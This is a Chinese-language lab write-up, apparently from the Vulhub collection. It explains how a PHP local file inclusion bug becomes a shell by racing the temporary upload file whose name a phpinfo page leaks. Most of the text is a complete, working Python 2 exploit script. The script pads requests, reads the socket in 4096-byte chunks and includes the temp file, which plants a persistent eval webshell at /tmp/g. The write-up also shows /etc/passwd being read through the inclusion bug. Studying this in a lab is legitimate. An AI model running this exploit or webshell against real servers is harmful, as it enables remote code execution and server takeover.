# PHP 利用 phpinfo 包含临时文件 getshell

## 漏洞描述

PHP 文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来 getshell。因为临时文件名是随机的，如果目标网站上存在 phpinfo，则可以通过 phpinfo 来获取临时文件名，进而进行包含。

参考链接：

- https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf

## 环境搭建

Vulhub 执行如下命令启动环境：

```
docker compose up -d
```

目标环境是 PHP7.2，说明该漏洞与 PHP 版本无关。

环境启动后，访问 `http://your-ip:8080/phpinfo.php` 即可看到一个 PHPINFO 页面，访问 `http://your-ip:8080/lfi.php?file=/etc/passwd`，可见的确存在文件包含漏洞。

## 漏洞分析

在给 PHP 发送 POST 数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP 都会将这个文件保存成一个临时文件（通常是 `/tmp/php[6个随机字符]`），文件名可以在 `$_FILES` 变量中找到。这个临时文件，在请求结束后就会被删除。

同时，因为 phpinfo 页面会将当前请求上下文中所有变量都打印出来，所以我们如果向 phpinfo 页面发送包含文件区块的数据包，则即可在返回包里找到 `$_FILES` 变量的内容，自然也包含临时文件名。

在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。

但文件包含漏洞和 phpinfo 页面通常是两个页面，理论上我们需要先发送数据包给 phpinfo 页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行 getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。

这个时候就需要用到条件竞争，具体流程如下：

1. 发送包含了 webshell 的上传数据包给 phpinfo 页面，这个数据包的 header、get 等位置需要塞满垃圾数据；
2. 因为 phpinfo 页面会将所有数据都打印出来，1 中的垃圾数据会将整个 phpinfo 页面撑得非常大；
3. php 默认的输出缓冲区大小为 4096，可以理解为 php 每次返回 4096 个字节给 socket 连接；
4. 所以，我们直接操作原生 socket，每次读取 4096 个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包；
5. 此时，第一个数据包的 socket 连接实际上还没结束，因为 php 还在继续每次输出 4096 个字节，所以临时文件此时还没有删除；
6. 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终 getshell。

## 漏洞复现

利用脚本 [exp.py](exp.py) 实现了上述过程，成功包含临时文件后，会执行 `<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>`，写入一个新的文件 `/tmp/g`，这个文件就会永久留在目标机器上。

用 python2 执行：`python exp.py your-ip 8080 100`：

![](images/PHP%20利用%20phpinfo%20包含临时文件%20getshell/image-20240529110408970.png)

可见，执行到第 118 个数据包的时候就写入成功。然后，利用 lfi.php，即可执行任意命令：

![](images/PHP%20利用%20phpinfo%20包含临时文件%20getshell/image-20240529110559208.png)

## 漏洞 POC

exp.py

```python
#!/usr/bin/python 
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /lfi.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt; ")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break                
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()
                    
            except socket.error:
                return
    

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)
    
    d = ""
    while True:
        i = s.recv(4096)
        d+=i        
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt; ")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    
    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():
    
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
    
    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",  
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()
    
    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```
